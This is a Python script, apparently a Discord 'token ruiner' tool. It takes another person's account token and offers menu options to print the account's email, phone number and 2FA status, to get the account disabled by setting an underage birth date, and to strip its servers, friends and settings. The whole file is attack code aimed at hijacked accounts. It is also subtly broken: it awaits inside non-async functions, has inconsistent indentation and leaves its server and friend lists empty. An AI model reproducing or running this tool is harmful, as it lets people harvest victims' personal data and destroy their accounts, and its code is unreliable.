import requests
import os
import colorama
import asyncio
from colorama import Fore

url = 'https://canary.discordapp.com/api/v8/users/@me'

guildsIds = []
friendsIds = []

def tokenRuin(token):
    headers = {'Authorization': token}
    print("Account has been ruined successfully!")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)

    while True:
        setting = {'theme': 'light', 'locale': 'zh-CN'}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)
        exit(0)

def tokenDisable(token):
    r = requests.patch(url, headers={'Authorization': token}, json={'date_of_birth': '2016-8-15'})
    if r.status_code == 400:
        print('Account has been disabled successfully!')
        exit(0)

def grabInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
            username = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
  Username: {username}
  User ID: {userID}
  2 Factor: {mfa}
  Email: {email}
  Phone Number: {phone if phone else "None"}
            ''')
            
def main1():
    os.system("clear")
    token = input("Token : ")
    headers = {'authorization': str(token)}
    src = requests.get(url, headers=headers)
    if src.status_code == 200:
        print('Token is valid. Starting in 5 seconds...')
        await asyncio.sleep(5)
        main2(token)
   else:
        print('Token is invalid...')
        await asyncio.sleep(3)
        main1()

def main2(token):
    os.system("clear")
    intro = """
 _        _                           _                 
| |_ ___ | | _____ _ __    _ __ _   _(_)_ __   ___ _ __ 
| __/ _ \| |/ / _ \ '_ \  | '__| | | | | '_ \ / _ \ '__|
| || (_) |   <  __/ | | | | |  | |_| | | | | |  __/ |   
 \__\___/|_|\_\___|_| |_| |_|   \__,_|_|_| |_|\___|_| 
 -------------------- Created by vqea --------------------
 ----------- [1] Grab Info -------------------------------
 ----------- [2] Disable ---------------------------------
 ----------- [3] Ruin ------------------------------------
 ----------- [4] Exit ------------------------------------
 """
 
    print(Fore.CYAN+intro)
    choice = input("Choice: ")

    if choice == '1':
        grabInfo(token)
        exit(0)
    
    elif choice == '2':
        tokenDisable(token)
    
    elif choice == '3':
        tokenRuin(token)
    
    elif choice == '4':
        exit(0)
    
    else:
      main2()
      
if __name__ == '__main__': 
   main1()
